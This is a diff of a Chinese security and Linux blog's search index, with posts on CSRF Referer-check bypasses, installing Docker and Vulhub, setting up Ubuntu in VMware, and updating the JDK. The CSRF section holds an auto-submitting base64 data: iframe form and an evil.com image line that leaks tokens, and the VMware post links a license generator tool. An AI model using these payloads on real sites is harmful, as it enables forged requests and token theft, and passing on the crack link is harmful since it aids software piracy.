@@ -54,17 +54,13 @@
 <h2 id="0x02-使用Referer进行CSRF防御"><a href="#0x02-使用Referer进行CSRF防御" class="headerlink" title="0x02 使用Referer进行CSRF防御"></a>0x02 使用Referer进行CSRF防御</h2><p>在PHP中使用<code>$_SERVER[&#39;HTTP_REFERER&#39;]</code>获取页面提交请求中的Referer值<br>这里需要用到一个strpos函数，用法参考 <span class="exturl" data-url="aHR0cHM6Ly93d3cudzNzY2hvb2wuY29tLmNuL3BocC9mdW5jX3N0cmluZ19zdHJwb3MuYXNw">PHP strpos() 函数-w3c<i class="fa fa-external-link-alt"></i></span><br>附上防御代码：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$referer &#x3D; $_SERVER[&quot;HTTP_REFERER&quot;];</span><br><span class="line">	if(strpos($referer,&quot;192.168.150.1&quot;) !&#x3D;&#x3D; false)</span><br><span class="line">	&#123;</span><br><span class="line">		echo $_SERVER[&quot;HTTP_REFERER&quot;];</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;successful&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		echo $_SERVER[&quot;HTTP_REFERER&quot;];</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;fail&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>strpos函数里面的意思也就是在获取的Referer值里面是否包含192.168.150.1这个域名，如果包含了说明是正确的，没包含就可能是恶意的</p>
-<h2 id="0x03-Referer-绕过"><a href="#0x03-Referer-绕过" class="headerlink" title="0x03 Referer 绕过"></a>0x03 Referer 绕过</h2><h3 id="1-Refere为空条件下"><a href="#1-Refere为空条件下" class="headerlink" title="1.Refere为空条件下"></a>1.Refere为空条件下</h3><pre><code>利用ftp://，http://，https://，file://，javascript:，data:，比如这个时候浏览器地址栏是 file:// 开头的，这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。</code></pre>
-<p>例：<br>① 利用<code>data:</code>协议</p>
-<pre><code>    &lt;html&gt;
-        &lt;body&gt;
-           &lt;iframe src=&quot;data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==&quot;&gt;
-        &lt;/body&gt; 
-    &lt;/html&gt;</code></pre>
-<p>② 利用<code>https</code>协议<br>    https向http跳转的时候Referer为空<br>    拿一个https的webshell<br>    <code>&lt;iframe src=&quot;https://www.xxxx.com/attack.php&quot;&gt;</code><br>    attack.php写上CSRF攻击代码</p>
-<h3 id="2-判断Referer是某域情况下绕过"><a href="#2-判断Referer是某域情况下绕过" class="headerlink" title="2.判断Referer是某域情况下绕过"></a>2.判断Referer是某域情况下绕过</h3><pre><code>比如你找的csrf是 `xxx.com`，验证的referer是验证的 `*.xx.com`，可以找个二级域名之后 `&lt;img &quot;csrf地址&quot;&gt;` 之后在把地址发出去就可以伪造。</code></pre>
-<h3 id="3-判断Referer是否存在某关键词"><a href="#3-判断Referer是否存在某关键词" class="headerlink" title="3.判断Referer是否存在某关键词"></a>3.判断Referer是否存在某关键词</h3><pre><code>Referer判断存在不存在`google.com`这个关键词，在网站新建一个`google.com`文件夹，把CSRF PoC存放在`google.com`目录，即可绕过。</code></pre>
-<h3 id="4-判断referer是否有某域名"><a href="#4-判断referer是否有某域名" class="headerlink" title="4.判断referer是否有某域名"></a>4.判断referer是否有某域名</h3><pre><code>判断了Referer开头是否以`126.com`以及126子域名  不验证根域名为 `126.com` 那么我这里可以构造子域名 `x.126.com.xxx.com` 作为蠕虫传播的载体服务器，即可绕过。</code></pre>
+<h2 id="0x03-Referer-绕过"><a href="#0x03-Referer-绕过" class="headerlink" title="0x03 Referer 绕过"></a>0x03 Referer 绕过</h2><h3 id="1-Refere为空条件下"><a href="#1-Refere为空条件下" class="headerlink" title="1.Refere为空条件下"></a>1.Refere为空条件下</h3><p>利用ftp://，http://，https://，file://，javascript:，data:，比如这个时候浏览器地址栏是 file:// 开头的，这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。<br>例：<br>① 利用<code>data:</code>协议</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">	    &lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg&#x3D;&#x3D;&quot;&gt;</span><br><span class="line">	&lt;&#x2F;body&gt; </span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>② 利用<code>https</code>协议<br>    https向http跳转的时候Referer为空<br>    拿一个https的webshell<br>    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;https:&#x2F;&#x2F;www.xxxx.com&#x2F;attack.php&quot;&gt;</span><br></pre></td></tr></table></figure><br>    attack.php写上CSRF攻击代码</p>
+<h3 id="2-判断Referer是某域情况下绕过"><a href="#2-判断Referer是某域情况下绕过" class="headerlink" title="2.判断Referer是某域情况下绕过"></a>2.判断Referer是某域情况下绕过</h3><p>比如你找的csrf是 <code>xxx.com</code>，验证的referer是验证的 <code>*.xx.com</code>，可以找个二级域名之后 <code>&lt;img &quot;csrf地址&quot;&gt;</code> 之后在把地址发出去就可以伪造。</p>
+<h3 id="3-判断Referer是否存在某关键词"><a href="#3-判断Referer是否存在某关键词" class="headerlink" title="3.判断Referer是否存在某关键词"></a>3.判断Referer是否存在某关键词</h3><p>Referer判断存在不存在<code>google.com</code>这个关键词，在网站新建一个<code>google.com</code>文件夹，把CSRF PoC存放在<code>google.com</code>目录，即可绕过。</p>
+<h3 id="4-判断referer是否有某域名"><a href="#4-判断referer是否有某域名" class="headerlink" title="4.判断referer是否有某域名"></a>4.判断referer是否有某域名</h3><p>判断了Referer开头是否以<code>126.com</code>以及126子域名  不验证根域名为 <code>126.com</code> 那么我这里可以构造子域名 <code>x.126.com.xxx.com</code> 作为蠕虫传播的载体服务器，即可绕过。</p>
 <h1 id="五、CSRF漏洞防御总结"><a href="#五、CSRF漏洞防御总结" class="headerlink" title="五、CSRF漏洞防御总结"></a>五、CSRF漏洞防御总结</h1><h2 id="0x01-验证码"><a href="#0x01-验证码" class="headerlink" title="0x01 验证码"></a>0x01 验证码</h2><p>验证码防御被认为是对抗CSRF最为简单而且有效的防御方法。<br>CSRF在用户不知情的情况下完成对应操作，而验证码强制用户与应用程序交互，才能最终完成操作。通常情况下，验证码能够很好的遏制CSRF。<br>但出于用户体验考虑，不可能每一个操作都加入验证码，所以验证码只作为辅助手段，不能作为防御CSRF的主要解决方案。</p>
 <ul>
 <li>验证码防御也可以被认为是二次验证</li>
@@ -72,7 +68,7 @@
 <h2 id="0x02-Referer-Check"><a href="#0x02-Referer-Check" class="headerlink" title="0x02 Referer Check"></a>0x02 Referer Check</h2><p>Referer Check主要用于防止盗链。同理也可以用来检查请求是否来自合法的“源”。<br>比如用户修改密码，一定是在登录系统后台之后进行操作，所以在修改提交表单的时候，一定会从系统后台页面提交，携带Referer头，如果Referer不是当前系统的域，那么极有可能遭受CSRF。</p>
 <p>缺陷：服务器并非任何时候都可以取到Referer。例如HTTPS跳转到HTTP。</p>
 <h2 id="0x03-Anti-CSRF-Token"><a href="#0x03-Anti-CSRF-Token" class="headerlink" title="0x03 Anti CSRF Token"></a>0x03 Anti CSRF Token</h2><p>CSRF本质原因：重要操作的所有参数都是被恶意攻击者猜测到的。<br>那么防御措施就是生成一个随机且不被轻易猜测的参数，目前大多数防御都采用不可预测的token值。</p>
-<p>缺陷：Token泄露<br>1.GET型Token泄露<br>例如：GET型Token泄露<br>页面包含 <code>&lt;img src=&quot;http://www.evil.com/&quot;/&gt;</code> 那么请求中的Referer就会携带对应的GET Token。</p>
+<p>缺陷：Token泄露<br>1.GET型Token泄露<br>页面包含 <code>&lt;img src=&quot;http://www.evil.com/&quot;/&gt;</code> 那么请求中的Referer就会携带对应的GET Token。</p>
 <p>2.POST型Token泄露<br>利用XSS漏洞获取其Cookie，查看存储在其中的Token值。</p>
 ]]></content>
       <categories>
@@ -276,6 +272,52 @@
       </tags>
   </entry>
   <entry>
+    <title>kali安装Docker并配置Vulhub</title>
+    <url>/archives/60505.html</url>
+    <content><![CDATA[<h1 id="一、安装Docker"><a href="#一、安装Docker" class="headerlink" title="一、安装Docker"></a>一、安装Docker</h1><h2 id="1-卸载旧版本Docker"><a href="#1-卸载旧版本Docker" class="headerlink" title="1. 卸载旧版本Docker"></a>1. 卸载旧版本Docker</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-配置软件源"><a href="#2-配置软件源" class="headerlink" title="2. 配置软件源"></a>2. 配置软件源</h2><h3 id="2-1-更新软件源并安装依赖包"><a href="#2-1-更新软件源并安装依赖包" class="headerlink" title="2.1 更新软件源并安装依赖包"></a>2.1 更新软件源并安装依赖包</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">sudo apt-get install \</span><br><span class="line">apt-transport-https \</span><br><span class="line">ca-certificates \</span><br><span class="line">curl \</span><br><span class="line">gnupg-agent \</span><br><span class="line">software-properties-common</span><br></pre></td></tr></table></figure>
+<h3 id="2-2-添加Docker官方软件包密钥"><a href="#2-2-添加Docker官方软件包密钥" class="headerlink" title="2.2 添加Docker官方软件包密钥"></a>2.2 添加Docker官方软件包密钥</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -fsSL https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;debian&#x2F;gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure>
+
+<p>验证密钥是否安装成功</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo apt-key fingerprint 0EBFCD88</span><br><span class="line"></span><br><span class="line">pub   4096R&#x2F;0EBFCD88 2017-02-22</span><br><span class="line">      Key fingerprint &#x3D; 9DC8 5822 9FC7 DD38 854A  E2D8 8D81 803C 0EBF CD88</span><br><span class="line">uid                  Docker Release (CE deb) &lt;docker@docker.com&gt;</span><br><span class="line">sub   4096R&#x2F;F273FCD8 2017-02-22</span><br></pre></td></tr></table></figure>
+<h3 id="2-3-添加软件源"><a href="#2-3-添加软件源" class="headerlink" title="2.3 添加软件源"></a>2.3 添加软件源</h3><p>查询当前系统所基于的Debian版本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;version</span><br></pre></td></tr></table></figure>
+<p>得到如图反馈</p>
+<img src="/archives/60505/kali-version.png" class="">
+
+<p>通过查询得知 Debian 9 对应的代号为 stretch ，之后执行以下命令写入docker软件源（其中 stretch 根据查询得到的代号自行修改）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;deb https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;debian stretch stable&#39; | sudo tee -a &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;docker.list</span><br></pre></td></tr></table></figure>
+<p>正常写入之后如图</p>
+<img src="/archives/60505/sources-list.png" class="">
+
+<h2 id="3-安装Docker"><a href="#3-安装Docker" class="headerlink" title="3. 安装Docker"></a>3. 安装Docker</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io -y</span><br></pre></td></tr></table></figure>
+
+<p>安装之后可以配置一下Docker镜像加速</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p &#x2F;etc&#x2F;docker</span><br><span class="line">sudo tee &#x2F;etc&#x2F;docker&#x2F;daemon.json &lt;&lt;-&#39;EOF&#39;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;http:&#x2F;&#x2F;hub-mirror.c.163.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
+<p>ps：阿里云有免费的加速服务，登录阿里云帐号-容器镜像服务-镜像加速器</p>
+<p>配置好后执行以下命令进行测试</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure>
+<p>正常反馈如图</p>
+<img src="/archives/60505/hello-world.png" class="">
+
+<h2 id="4-卸载Docker"><a href="#4-卸载Docker" class="headerlink" title="4. 卸载Docker"></a>4. 卸载Docker</h2><h3 id="4-1-卸载软件"><a href="#4-1-卸载软件" class="headerlink" title="4.1 卸载软件"></a>4.1 卸载软件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get purge docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>
+<h3 id="4-2-删除镜像、容器、自定义配置等文件"><a href="#4-2-删除镜像、容器、自定义配置等文件" class="headerlink" title="4.2 删除镜像、容器、自定义配置等文件"></a>4.2 删除镜像、容器、自定义配置等文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo rm -rf &#x2F;var&#x2F;lib&#x2F;docker</span><br></pre></td></tr></table></figure>
+
+<h1 id="二、安装Docker-Compose"><a href="#二、安装Docker-Compose" class="headerlink" title="二、安装Docker-Compose"></a>二、安装Docker-Compose</h1><h2 id="安装Docker-Compose"><a href="#安装Docker-Compose" class="headerlink" title="安装Docker-Compose"></a>安装Docker-Compose</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo curl -L &quot;https:&#x2F;&#x2F;github.com&#x2F;docker&#x2F;compose&#x2F;releases&#x2F;download&#x2F;1.25.5&#x2F;docker-compose-$(uname -s)-$(uname -m)&quot; -o &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose</span><br><span class="line">sudo chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose</span><br><span class="line">docker-compose -v</span><br></pre></td></tr></table></figure>
+<p>回显版本号则安装成功</p>
+<h2 id="卸载Docker-Compose"><a href="#卸载Docker-Compose" class="headerlink" title="卸载Docker-Compose"></a>卸载Docker-Compose</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo rm &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose</span><br></pre></td></tr></table></figure>
+
+<h1 id="三、配置Vulhub"><a href="#三、配置Vulhub" class="headerlink" title="三、配置Vulhub"></a>三、配置Vulhub</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#下载靶场</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub.git</span><br><span class="line"></span><br><span class="line">#看看都有哪些靶场</span><br><span class="line">ls vulhub</span><br><span class="line"></span><br><span class="line">#选择一个靶场，比如struts2的系列漏洞</span><br><span class="line">cd vulhub&#x2F;struts2&#x2F;s2-057&#x2F;</span><br><span class="line"></span><br><span class="line">#启动靶场</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"></span><br><span class="line">#关闭靶场</span><br><span class="line">sudo docker-compose down</span><br><span class="line"></span><br><span class="line">#清理环境</span><br><span class="line">sudo docker rm $(docker ps -a -q)</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>Kali Linux</tag>
+        <tag>Docker</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux基础知识</title>
     <url>/archives/29244.html</url>
     <content><![CDATA[<h1 id="0x01-常见shell命令"><a href="#0x01-常见shell命令" class="headerlink" title="0x01 常见shell命令"></a>0x01 常见shell命令</h1><ul>
@@ -335,6 +377,108 @@
 <li>监控netlink消息<br>ip monitor all<br>[ip命令参考文章]<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veXN1d2FuZ3FpYW5nL3AvMTE1Mjc2MTkuaHRtbA==">https://www.cnblogs.com/ysuwangqiang/p/11527619.html<i class="fa fa-external-link-alt"></i></span></li>
 </ul>
 <h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><span class="exturl" data-url="aHR0cDovL21hbi5saW51eGRlLm5ldC8=">Linux命令大全<i class="fa fa-external-link-alt"></i></span></p>
+]]></content>
+      <categories>
+        <category>嵌入式开发</category>
+      </categories>
+      <tags>
+        <tag>Ubuntu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>VMware安装Ubuntu 20.04 LTS图解</title>
+    <url>/archives/574.html</url>
+    <content><![CDATA[<div class="note info no-icon">
+            <h1 id="写在开头"><a href="#写在开头" class="headerlink" title="写在开头"></a>写在开头</h1><p>Ubuntu 和 Windows 有何不同？<br>从大的方面讲，它们的设计理念不同，借用一位前辈的话：“Windows为不知道自己正在做什么的人设计，Linux为知道自己要做什么，正在做什么的人设计”。<br>从小的方面讲，用户体验不同。Windows 将机器置于一个和人对等的位置，它会对你提出要求，让你跟着它去做。Linux将机器置于服务于人的位置，它是一台服务于你的机器，听你指挥，接受你的配置，适当时候会提示你，但绝不会命令你。<br>刚开始从Windows到Ubuntu，肯定会不习惯，但是当你熟悉了这些操作，你会发现这是更高效的方法，这是另一种体验，你发号施令，让机器为你而运转，你会体验到机器服务于人的设计理念。在熟悉Ubuntu之后，我相信，你也会喜欢上这个简洁而优雅的开源世界。</p>
+          </div>
+<img src="/archives/574/Ubuntu-Desktop.png" class="">
+
+<hr>
+<h1 id="1-镜像下载及相关知识"><a href="#1-镜像下载及相关知识" class="headerlink" title="1. 镜像下载及相关知识"></a>1. 镜像下载及相关知识</h1><h2 id="1-1-镜像下载地址"><a href="#1-1-镜像下载地址" class="headerlink" title="1.1 镜像下载地址"></a>1.1 镜像下载地址</h2><p><span class="exturl" data-url="aHR0cHM6Ly9jbi51YnVudHUuY29tL2Rvd25sb2Fk">Ubuntu官网下载地址<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9taXJyb3JzLmFsaXl1bi5jb20vdWJ1bnR1LXJlbGVhc2VzLw==">阿里云镜像站<i class="fa fa-external-link-alt"></i></span></p>
+<h2 id="1-2-各版本介绍"><a href="#1-2-各版本介绍" class="headerlink" title="1.2 各版本介绍"></a>1.2 各版本介绍</h2><div class="note info no-icon">
+            <p>桌面版：即日常使用版本，带有GUI(图形化界面)，为个人电脑所配置。<br>服务器版：适用于web服务器，没有GUI，但包含了所有你需要启动托管站点的软件，即LAMP(Linux、Apache、MySQL和PHP)。<br>物联网版：即Ubuntu Core，适用于边缘计算和大型设备网络。</p>
+          </div>
+
+<p>博主使用的从阿里云镜像站下载的<span class="exturl" data-url="aHR0cHM6Ly9taXJyb3JzLmFsaXl1bi5jb20vdWJ1bnR1LXJlbGVhc2VzLzIwLjA0L3VidW50dS0yMC4wNC1iZXRhLWRlc2t0b3AtYW1kNjQuaXNv">ubuntu-20.04-beta-desktop-amd64<i class="fa fa-external-link-alt"></i></span>版本</p>
+<h1 id="2-虚拟机配置"><a href="#2-虚拟机配置" class="headerlink" title="2. 虚拟机配置"></a>2. 虚拟机配置</h1><h2 id="2-1-VMware-Workstation-Pro下载"><a href="#2-1-VMware-Workstation-Pro下载" class="headerlink" title="2.1 VMware Workstation Pro下载"></a>2.1 VMware Workstation Pro下载</h2><div class="note info no-icon">
+            <p>官网下载的15.5.0版本，外加上不记得哪儿撸的许可证生成工具<br><span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMUJkVnBLNlpNajkzd0ktVkdCUkVlTWc=">百度网盘<i class="fa fa-external-link-alt"></i></span> 提取码：3vpv</p>
+          </div>
+
+<h2 id="2-2-虚拟机创建及配置"><a href="#2-2-虚拟机创建及配置" class="headerlink" title="2.2 虚拟机创建及配置"></a>2.2 虚拟机创建及配置</h2><h3 id="①-创建新的虚拟机-典型-稍后安装操作系统"><a href="#①-创建新的虚拟机-典型-稍后安装操作系统" class="headerlink" title="① 创建新的虚拟机 - 典型 - 稍后安装操作系统"></a>① 创建新的虚拟机 - 典型 - 稍后安装操作系统</h3><img src="/archives/574/ubuntu-vm.png" class="">
+
+<h3 id="②-虚拟机配置"><a href="#②-虚拟机配置" class="headerlink" title="② 虚拟机配置"></a>② 虚拟机配置</h3><p>指定系统版本为 Ubuntu 64位</p>
+<img src="/archives/574/u-version.png" class="">
+
+<p>自定义虚拟机名称和存放位置</p>
+<img src="/archives/574/u-name.png" class="">
+
+<p>磁盘分配60g足矣</p>
+<img src="/archives/574/u-disk.png" class="">
+
+<p>接着来到自定义硬件</p>
+<img src="/archives/574/u-custom.png" class="">
+
+<p>点开自定义硬件，选中<code>新CD/DVD(SATA)</code>选项，在这里导入我们下载好的ISO文件<br>ps：可以将无用硬件移除以提升系统运行效率，例如打印机、声卡等，运行内存至少分配2g，处理器核心数自定</p>
+<img src="/archives/574/u-iso.png" class="">
+
+
+<h1 id="3-系统安装及配置"><a href="#3-系统安装及配置" class="headerlink" title="3. 系统安装及配置"></a>3. 系统安装及配置</h1><h2 id="3-1-系统安装"><a href="#3-1-系统安装" class="headerlink" title="3.1 系统安装"></a>3.1 系统安装</h2><h3 id="1-进入安装界面"><a href="#1-进入安装界面" class="headerlink" title="1. 进入安装界面"></a>1. 进入安装界面</h3><p>开机会先进行磁盘检测，稍等即刻，然后来到安装界面，拉到最下面选择中文(简体)并安装Ubuntu</p>
+<img src="/archives/574/install1.png" class="">
+<p>键盘布局保持默认直接下一步</p>
+<h3 id="2-更新和其他软件"><a href="#2-更新和其他软件" class="headerlink" title="2. 更新和其他软件"></a>2. 更新和其他软件</h3><p>取消勾选<code>安装Ubuntu时下载更新</code></p>
+<img src="/archives/574/install2.png" class="">
+
+<h3 id="3-安装类型"><a href="#3-安装类型" class="headerlink" title="3. 安装类型"></a>3. 安装类型</h3><p>保持默认选项，点击<code>现在安装</code></p>
+<img src="/archives/574/install3.png" class="">
+
+<h3 id="4-将改动写入磁盘"><a href="#4-将改动写入磁盘" class="headerlink" title="4. 将改动写入磁盘"></a>4. 将改动写入磁盘</h3><img src="/archives/574/install4.png" class="">
+
+<h3 id="5-选择时区"><a href="#5-选择时区" class="headerlink" title="5. 选择时区"></a>5. 选择时区</h3><img src="/archives/574/install5.png" class="">
+
+<h3 id="6-设置用户名和密码"><a href="#6-设置用户名和密码" class="headerlink" title="6. 设置用户名和密码"></a>6. 设置用户名和密码</h3><img src="/archives/574/install6.png" class="">
+
+<h3 id="7-开始安装系统"><a href="#7-开始安装系统" class="headerlink" title="7. 开始安装系统"></a>7. 开始安装系统</h3><p>到这里可以去抽根烟喝口茶，静待安装程序结束</p>
+<img src="/archives/574/install7.png" class="">
+<p>ps：过程中会出现<code>正在下载语言包</code>或者<code>软件包</code>的字样，因为没有配置国内源，所以会很慢，这里我们可以点开三角形图标有个skip，点击即可跳过下载</p>
+<img src="/archives/574/u-skip.png" class="">
+
+<p>安装完点击现在重启会出现如下报错</p>
+<img src="/archives/574/error1.png" class="">
+<p>我们只需要关闭虚拟机，在<code>CD/DVD(SATA)</code>中取消启动时连接，再开机即可正常进入系统</p>
+<img src="/archives/574/solve1.png" class="">
+<img src="/archives/574/solve2.png" class="">
+
+<h2 id="3-2-系统配置"><a href="#3-2-系统配置" class="headerlink" title="3.2 系统配置"></a>3.2 系统配置</h2><h3 id="1-安装VMware-Tools"><a href="#1-安装VMware-Tools" class="headerlink" title="1. 安装VMware Tools"></a>1. 安装VMware Tools</h3><p>有了它你才能将主机文件直接复制粘贴到虚拟机上，同时窗口尺寸也可以自适应了</p>
+<ul>
+<li><p>菜单栏 虚拟机 - 安装VMware Tools</p>
+<img src="/archives/574/vmtools1.png" class="">
+</li>
+<li><p>会有一个弹窗，点击即可打开文件夹，将挂载的VMware Tools中的压缩包拷贝到Ubuntu本地，比如桌面，并解压</p>
+<img src="/archives/574/vmtools2.png" class="">
+</li>
+<li><p>进入解压出来的文件夹，右键空白处选择在此处打开终端</p>
+<img src="/archives/574/vmtools3.png" class="">
+</li>
+<li><p>开始安装VMware Tools，键入命令后回车执行，第一个问题需要键入<code>yes</code>进行确认，之后一路回车，出现 <code>Enjoy</code> 字样即安装成功，重启生效</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo .&#x2F;vmware-install.pl</span><br></pre></td></tr></table></figure>
+<img src="/archives/574/vmtools4.png" class="">
+
+</li>
+</ul>
+<h3 id="2-配置软件源"><a href="#2-配置软件源" class="headerlink" title="2. 配置软件源"></a>2. 配置软件源</h3><ul>
+<li><p>打开软件更新器，稍等一会儿，进入设置-Ubuntu软件，勾选源代码，之后就可以自由选择软件源了</p>
+<img src="/archives/574/source1.png" class="">
+<img src="/archives/574/source2.png" class="">
+</li>
+<li><p>这里我选择阿里的源，地区不同，不同的源效果也不同，可以点击选择最佳服务器让系统自行测速之后选择最佳的</p>
+<img src="/archives/574/source3.png" class="">
+</li>
+<li><p>关闭之后点击立即安装，开始系统安装后的第一次更新</p>
+<img src="/archives/574/source4.png" class="">
+
+</li>
+</ul>
+<p>整个安装过程就这些，有问题请在下方留言</p>
 ]]></content>
       <categories>
         <category>嵌入式开发</category>
@@ -481,151 +625,46 @@
       </tags>
   </entry>
   <entry>
-    <title>kali安装Docker并配置Vulhub</title>
-    <url>/archives/60505.html</url>
-    <content><![CDATA[<h1 id="一、安装Docker"><a href="#一、安装Docker" class="headerlink" title="一、安装Docker"></a>一、安装Docker</h1><h2 id="1-卸载旧版本Docker"><a href="#1-卸载旧版本Docker" class="headerlink" title="1. 卸载旧版本Docker"></a>1. 卸载旧版本Docker</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure>
+    <title>Kali更新jdk-8u251</title>
+    <url>/archives/9111.html</url>
+    <content><![CDATA[<div class="note info no-icon">
+            <h1 id="为啥突然写这篇文章？"><a href="#为啥突然写这篇文章？" class="headerlink" title="为啥突然写这篇文章？"></a>为啥突然写这篇文章？</h1><p>今天打开尘封已久的 Burpsuite 时给我来了个弹窗，如下图<br><img src="/archives/9111/1.png" class=""><br>根据博主的英语水平我jio的它说的是：你的jre版本我们(burp)没有测试过，你用的时候阔能会出毛病。<br>emmm，然后事实证明确实出了毛病，使用的时候发现端口监听勾不上了</p>
+          </div>
+<p>第一时间当然是查看当前的java版本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure>
+<p>然后发现丫的我就没见过这版本号</p>
+<img src="/archives/9111/2.png" class="">
+<p>后来查了一下啥是OpenJDK，得到了这篇文章：<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC80NDFhYTFhOTc2YjM=">OpenJDK与JDK的区别分析<i class="fa fa-external-link-alt"></i></span></p>
+<p>话不多说，上正题</p>
+<h1 id="1-卸载原装jdk"><a href="#1-卸载原装jdk" class="headerlink" title="1. 卸载原装jdk"></a>1. 卸载原装jdk</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">which java  #查看JDK的安装路径</span><br><span class="line">sudo rm -rf &#x2F;usr&#x2F;bin&#x2F;java   # 这里的路径即为上一条命令返回的路径，自行修改</span><br></pre></td></tr></table></figure>
 
-<h2 id="2-配置软件源"><a href="#2-配置软件源" class="headerlink" title="2. 配置软件源"></a>2. 配置软件源</h2><h3 id="2-1-更新软件源并安装依赖包"><a href="#2-1-更新软件源并安装依赖包" class="headerlink" title="2.1 更新软件源并安装依赖包"></a>2.1 更新软件源并安装依赖包</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">sudo apt-get install \</span><br><span class="line">apt-transport-https \</span><br><span class="line">ca-certificates \</span><br><span class="line">curl \</span><br><span class="line">gnupg-agent \</span><br><span class="line">software-properties-common</span><br></pre></td></tr></table></figure>
-<h3 id="2-2-添加Docker官方软件包密钥"><a href="#2-2-添加Docker官方软件包密钥" class="headerlink" title="2.2 添加Docker官方软件包密钥"></a>2.2 添加Docker官方软件包密钥</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -fsSL https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;debian&#x2F;gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure>
+<h1 id="2-下载JDK"><a href="#2-下载JDK" class="headerlink" title="2. 下载JDK"></a>2. 下载JDK</h1><ul>
+<li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cub3JhY2xlLmNvbS9qYXZhL3RlY2hub2xvZ2llcy9qYXZhc2UtamRrOC1kb3dubG9hZHMuaHRtbA==">Oracle官方下载地址<i class="fa fa-external-link-alt"></i></span><br>ps: 下载<code>Linux x64 Compressed Archive</code>这个版本，好像需要注册帐号，登录才能下载</p>
+</li>
